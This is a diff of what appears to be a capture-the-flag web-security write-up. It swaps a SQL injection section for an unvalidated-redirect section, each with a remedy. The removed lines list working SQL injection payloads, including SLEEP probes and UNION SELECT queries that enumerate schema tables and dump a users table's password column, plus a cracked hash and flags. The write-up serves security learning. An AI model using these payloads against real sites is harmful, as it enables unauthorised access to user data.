@@ -1,41 +1,14 @@
-# SQL_Injection
-Ahhhh the notorious SQL Injection. This attack aims to manipulate the database specifically an SQL database to expose sensitive data such as user email and password if the website does have such. Basically if an Input is used to search through the database for a specif field, table or database data, and is not hanled properly by the server. A hacker can just simply append an Instruction to value that asks for the database to give out more information than what was originally purposed.
+# Unvalidated =_Redirect
+Unvalidated redirect is when a web application accepts untrusted input that can cause the web application to redirect to an untrusted URL. By modifying redirect URL input to a malicious site, an attacker may successfully launch a phishing scam and steal user credentials.
 
 ## Example
-In http://192.168.43.251/index.php?page=member, we are presented with a page that has a form input. An obvious assumpution is that since the input requires a values to search for a particular member, that value is used by the server to query the database. We can simply check this by giving a value and appending to it anything that might error, or even tell us the type of SQL database that is beign used for example.
+<a href="http://192.168.43.251/">Index</a> present such a vulnerablity. When inspecting th footer elements. We see that the elements are respectively linked to redirects that we can manipulate.
 
-## Commands
-* ' 
-* 1  AND 1 = SLEEP(2);--
-* 1 UNION (SELECT 1,2 FROM dual );--
-* 1 UNION (SELECT TABLE_NAME, TABLE_SCHEMA  FROM information_schema.tables);--
-* 1 UNION (SELECT COLUMN_NAME, 1 FROM information_schema.columns );--
-
-### One of these tables is users
-> * Table : users
-> * Colunm : user_id
-> * Colunm : first_name
-> * Colunm : last_name
-> * Colunm : town
-> * Colunm : country
-> * Colunm : planet
-> * Colunm : Commentaire
-> * Colunm : countersign
-
-* And through a number of these commands we are able to retrieve out flag   
-
-### Retrive flag
-* 1 UNION (SELECT user_id, first_name FROM users);--
-* 1 UNION (SELECT last_name, town FROM users);--
-* 1 UNION (SELECT country, planet FROM users);--
-* 1 UNION (SELECT Commentaire, countersign FROM users);--
-* instruction: Decrypt this password -> then lower all the char. Sh256 on it and it's good !   
-* hash : 5ff9d0165b4f92b14994e5c685cdce28
-
-* flag: 5ff9d0165b4f92b14994e5c685cdce28 -md5> fortytwo -sha256> 10a16d834f9b1e4068b25c4c46fe0284e99e44dceaf08098fc83925ba6310ff5 
+## Exploit
+When we manilate these values and click them, we are presented with our flag: b9e775a0291fed784a2d9680fcfad7edd6b8cdf87648da647aaf4bba288bcab3
 
 ## Remedy
-* Now all of this  can be prevented by using prepared statements. Prepared statement will tell that database to look at the input as nothing else but just that, an input.
+*  validate and sanitise user-input to determine whether the URL is safe.
 
 ## Resources
-* https://www.youtube.com/watch?v=ciNHn38EyRc
+* https://cheatsheetseries.owasp.org/cheatsheets/Unvalidated_Redirects_and_Forwards_Cheat_Sheet.html
